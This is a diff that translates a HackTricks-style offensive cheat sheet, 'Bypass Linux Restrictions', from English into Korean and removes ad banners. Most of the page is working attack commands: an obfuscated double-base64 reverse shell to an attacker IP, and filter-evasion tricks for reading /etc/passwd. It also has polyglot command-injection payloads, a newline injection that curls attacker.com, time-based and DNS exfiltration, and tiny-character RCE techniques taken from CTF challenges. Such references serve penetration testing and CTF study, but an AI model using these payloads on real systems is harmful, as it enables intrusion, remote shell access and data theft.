@@ -1,27 +1,16 @@
-# Bypass Linux Restrictions
+# 리눅스 제한 우회
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
+## 일반적인 제한 우회
 
-\
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
-
-## Common Limitations Bypasses
-
-### Reverse Shell
-
+### 리버스 셸
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-
-### Short Rev shell
-
+### 짧은 Rev 셸
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -29,9 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-
-### Bypass Paths and forbidden words
-
+### 우회 경로 및 금지된 단어
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -91,9 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-
-### Bypass forbidden spaces
-
+### 금지된 공백 우회
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -120,22 +105,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-
-### Bypass backslash and slash
-
+### 백슬래시 및 슬래시 우회
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-
-### Bypass pipes
-
+### 파이프 우회
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-
-### Bypass with hex encoding
-
+### 16진수 인코딩을 통한 우회
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -145,36 +124,28 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-
-### Bypass IPs
-
+### IP 우회
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-
-### Time based data exfiltration
-
+### 시간 기반 데이터 유출
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-
-### Getting chars from Env Variables
-
+### 환경 변수에서 문자 가져오기
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
+### DNS 데이터 유출
 
-### DNS data exfiltration
+예를 들어 **burpcollab** 또는 [**pingb**](http://pingb.in)를 사용할 수 있습니다.
 
-You could use **burpcollab** or [**pingb**](http://pingb.in) for example.
+### 내장 명령어
 
-### Builtins
-
-In case you cannot execute external functions and only have access to a **limited set of builtins to obtain RCE**, there are some handy tricks to do it. Usually you **won't be able to use all** of the **builtins**, so you should **know all your options** to try to bypass the jail. Idea from [**devploit**](https://twitter.com/devploit).\
-First of all check all the [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Then here you have some **recommendations**:
-
+외부 함수를 실행할 수 없고 **RCE를 얻기 위해 제한된 내장 명령어 집합에만 접근할 수 있는 경우**, 이를 수행하기 위한 몇 가지 유용한 요령이 있습니다. 일반적으로 **모든** **내장 명령어**를 사용할 수 없으므로, 감옥을 우회하기 위해 **모든 옵션을 알아야** 합니다. 아이디어는 [**devploit**](https://twitter.com/devploit)에서 가져왔습니다.\
+먼저 모든 [**셸 내장 명령어**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**를 확인하세요.** 그런 다음 여기에 몇 가지 **추천 사항**이 있습니다:
 ```bash
 # Get list of builtins
 declare builtins
@@ -226,30 +197,22 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-
-### Polyglot command injection
-
+### 다중 언어 명령 주입
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-
-### Bypass potential regexes
-
+### 잠재적인 정규 표현식 우회
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-
 ### Bashfuscator
-
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-
-### RCE with 5 chars
-
+### 5자 RCE
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -296,9 +259,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-
-### RCE with 4 chars
-
+### 4글자로 RCE
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -333,34 +294,25 @@ ln /f*
 'sh x'
 'sh g'
 ```
+## 읽기 전용/실행 금지/디스트로레스 우회
 
-## Read-Only/Noexec/Distroless Bypass
-
-If you are inside a filesystem with the **read-only and noexec protections** or even in a distroless container, there are still ways to **execute arbitrary binaries, even a shell!:**
+**읽기 전용 및 실행 금지 보호**가 있는 파일 시스템이나 디스트로레스 컨테이너 내에 있더라도, **임의의 바이너리, 심지어 쉘을 실행할 수 있는 방법이 여전히 있습니다!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot & other Jails Bypass
+## Chroot 및 기타 감옥 우회
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
 
-## References & More
+## 참고자료 및 추가 정보
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-
-<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 {{#include ../../banners/hacktricks-training.md}}
